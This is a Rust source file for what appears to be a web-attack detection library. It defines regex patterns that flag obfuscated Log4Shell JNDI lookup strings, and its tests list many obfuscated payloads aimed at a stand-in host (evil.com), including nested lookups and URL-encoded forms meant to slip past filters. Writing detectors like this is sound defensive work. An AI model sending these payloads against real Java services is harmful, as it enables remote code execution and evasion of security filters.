// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{regex_detect, AttackCategory, DetectionResult, Detector, Severity};
use regex::Regex;
use std::sync::LazyLock;

// 与 JndiInjectionDetector 的分工：那边认字面量 `${jndi:`、`${lower:j}`，
// 这边专攻"lookup 展开后才拼出 jndi"的混淆变体——攻击串里根本不含 `jndi` 五个字母。
static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // ${lower:j} / ${upper:J}：单字符大小写折叠，正常模板不会这么写
        Regex::new(r"(?i)\$\{(?:lower|upper)\s*:\s*[a-z]\s*\}").unwrap(),
        // ${::-j}：前缀折叠
        Regex::new(r"(?i)\$\{\s*::-?[a-z]{1,3}\s*\}").unwrap(),
        // ${...}ndi: —— 任意 lookup 展开结果紧邻 ndi
        Regex::new(r"(?i)\$\{[^{}]{0,120}\}[a-z]{0,4}ndi\s*[:/{]").unwrap(),
        // ${${...}}：嵌套 lookup（正常模板与代码里几乎不出现）
        Regex::new(r"\$\{[^{}]{0,120}\$\{[^{}]{0,120}\}").unwrap(),
        // URL 编码形态 %24%7Blower%3Aj%7Dndi，绕 WAF 用
        Regex::new(r"(?i)%24%7b.{0,120}%7d.{0,4}ndi").unwrap(),
    ]
});

pub struct Log4ShellDetector;

impl Detector for Log4ShellDetector {
    fn name(&self) -> &'static str {
        "log4shell"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(&PATTERNS, self.name(), AttackCategory::Protocol, Severity::Critical, "Log4Shell lookup obfuscation detected", input)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_helpers::{assert_clean, assert_detected};

    fn det() -> Log4ShellDetector {
        Log4ShellDetector
    }

    fn assert_hit(input: &str) {
        assert_detected(&det(), input, AttackCategory::Protocol, Severity::Critical);
    }

    #[test]
    fn name_is_log4shell() {
        assert_eq!(det().name(), "log4shell");
    }

    #[test]
    fn detects_case_folding_lookup() {
        for input in [
            "${lower:j}ndi:ldap://evil.com/a}",
            "${upper:j}NDI:rmi://evil.com/a}",
            "${lower:j}",
            "${upper:J}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_prefix_collapse_lookup() {
        for input in [
            "${::-j}ndi:ldap://evil.com/a}",
            "${::-j}",
            "${::-J}ndi:dns://evil.com}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_lookup_then_ndi_tail() {
        for input in [
            "${env:BARFOO:-j}ndi:ldap://evil.com/a}",
            "${sys:user.name}ndi:ldap://evil.com/a}",
            "${date:'j'}ndi:ldap://evil.com/a}",
            "${java:version}ndi://evil.com/x}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_nested_lookup() {
        for input in [
            "${${lower:j}ndi:ldap://evil.com/a}",
            "${${env:FOO:-ldap}://evil.com/a}",
            "${${sys:x}${lower:j}}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn detects_url_encoded_payload() {
        for input in [
            "%24%7Blower%3Aj%7Dndi:ldap://evil.com/a",
            "%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fevil.com%7D",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn ignores_benign_inputs() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "the price is ${amount}",
            "The total is ${total} dollars, tax is ${tax}.",
            "cost: $10",
            "const x = `${name}`; // 模板字符串",
            "printf(\"%s\", ${var});",
            "${date:yyyy-MM-dd} 是 log4j 的日期占位符",
            "${env:JAVA_HOME} 读取环境变量",
            "url: http://example.com/?q=%24%7Bfoo%7D",
        ] {
            assert_clean(&det(), input);
        }
    }

    #[test]
    fn edge_cases() {
        assert_clean(&det(), "");
        assert_clean(&det(), "   ");
        assert_clean(&det(), "你好世界 こんにちは");
        // 缺 ${ 或 } 的近失串
        assert_clean(&det(), "lower:j}ndi:ldap://evil.com");
        assert_clean(&det(), "${lower:jndi:ldap://evil.com}");
        assert_clean(&det(), "${ndi:ldap://evil.com}");
    }
}
